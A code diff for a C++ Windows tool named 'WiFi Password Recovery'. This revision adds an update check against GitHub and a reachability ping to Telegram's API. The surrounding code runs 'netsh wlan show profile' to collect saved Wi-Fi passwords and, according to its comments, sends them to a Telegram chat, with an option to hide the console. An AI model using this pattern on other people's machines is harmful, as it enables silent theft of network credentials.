@@ -1,11 +1,12 @@
 #include <iostream>
 #include <windows.h>
-#include <essentials.h> // Libreria fatta da me per semplificare diverse azioni
-#include <EssCurl.h> // Libreria fatta da me per semplificare l'utilizzo di CURL, in questo caso verrà usata per il bot Telegram
+#include <essentials.h> // Libreria per semplificare avriate funzioni
+#include <EssCurl.h> // Libreria per semplificare l'utilizzo di CURL, in questo caso verrà usata per il bot Telegram
 
 using namespace std;
 
 string GetChatID(TelegramBot&, Log&); // Prototipo della funzione per ottenere il ChatID
+void CheckUpdate(string, Log&); // Prototipo per controllare gli Update
 
 int main()
 {	
@@ -20,6 +21,7 @@ int main()
 	lg.WriteLog("Inizializzazione."); // Scrivo sul file di log
 	string ChatID;
 	string buffer;
+	string Versione="1.0.2"; // Versione locale del programma
 	bool Debug=false;
 	vector<string> SSID; // Utilizzo i vettori per l'allocazione dinamica (e perché sono belli :3)
 	vector<string> Password;
@@ -51,12 +53,21 @@ int main()
 		return 0;
 	}
 	
-	if(sfs.GetSetting("HideConsole") == "true")
-		cu.HideConsole();
-	ChatID=sfs.GetSetting("Chat_ID"); // Leggo l'ID della chat a cui mandare il messaggio Telegram
-	
 	if(sfs.GetSetting("DebugMode") == "true")
 		Debug=true;
+	if(sfs.GetSetting("CheckUpdate") == "true")
+		CheckUpdate(Versione, lg);
+	if(sfs.GetSetting("HideConsole") == "true")
+		cu.HideConsole();
+	
+	ChatID=sfs.GetSetting("Chat_ID"); // Leggo l'ID della chat a cui mandare il messaggio Telegram
+	
+	if(gu.NoOutputCMD("ping api.telegram.org -n 1") != 0) // Controllo che le API siano raggiungibili
+	{
+		lg.WriteLog("[Errore] - Impossibile raggiungere le API di Telegram.");
+		msgb.Ok("Collegamento con le API di Telegram fallito.\nVerificare la connessione ad internet e riprovare.", msgb.Error, "WiFi Password Recovery");
+		return 0;
+	}
 	
 	lg.WriteLog("Esecuzione comando \"netsh wlan show profile\".");
 	buffer=gu.GetCMDOutput("netsh wlan show profile"); // Eseguo il comando per ottenere i profili di rete salvati
@@ -127,6 +138,23 @@ int main()
 	}
 	
 	return 0;
+}
+
+void CheckUpdate(string Versione, Log& lg) // Funzione per controllare la presenza di Update
+{
+	GitHub gh; // Classe di EssCurl per l'uso semplificato delle API di GitHub
+	EasyMSGB msgb;
+	GeneralUtils gu;
+	
+	lg.WriteLog("Verifica Update.");
+	string LastRelease=gh.GetRepoTag("criper98", "wifi-password-recovery", "UserAuth"); // Ottengo il TAG più recente
+	
+	if(LastRelease != Versione) // Se le versioni non coincidono:
+	{
+		lg.WriteLog("Update trovato, versione locale ["+Versione+"], versione attuale ["+LastRelease+"]");
+		if(msgb.YesNo("La versione di \"WiFi Password Recovery\" che stai usando non e' aggiornata.\nSi desidera scaricare la versione piu' recente?", msgb.Info, "Update!"))
+			gu.OpenURL("https://github.com/Criper98/WiFi-Password-Recovery/releases/latest");
+	}
 }
 
 string GetChatID(TelegramBot& tb, Log& lg) // Funzione per ottenere l'ID della chat al quale il bot Telegram dovrà mandare i messaggi
